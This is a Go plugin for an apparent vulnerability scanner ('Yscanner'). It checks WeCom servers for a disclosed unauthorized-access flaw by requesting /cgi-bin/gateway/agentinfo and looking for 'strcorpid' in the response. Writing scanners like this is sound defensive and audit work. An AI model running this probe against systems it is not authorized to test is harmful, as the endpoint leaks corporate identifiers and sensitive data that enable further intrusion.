package goplugin

import (
	"Yscanner/utils"
	"net/http"
	"strings"
)

func init() {
	Register("work_weixin_agentinfo", &work_weixin_agentinfo{})
}

type work_weixin_agentinfo struct{}

func (p *work_weixin_agentinfo) Info() PluginInfo {
	return PluginInfo{
		Name:     "企业微信 agentinfo 未授权访问漏洞",
		VulnInfo: "企业微信是腾讯微信团队为企业打造的专业办公管理工具。2023年8月，互联网上披露其相关接口存在未授权访问漏洞，攻击者可构造恶意请求获取敏感信息，并组合调用相关API接口",
		VulnID:   "",
		Level:    "HIGH",
		URL:      "",
		Version:  "",
		CWE:      "",
	}
}

func (p *work_weixin_agentinfo) Check(netloc string) bool {
	req, err := http.NewRequest("GET", netloc+"/cgi-bin/gateway/agentinfo", nil)
	if err != nil {
		return false
	}
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}

	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, "strcorpid") {
		return true
	}
	return false
}
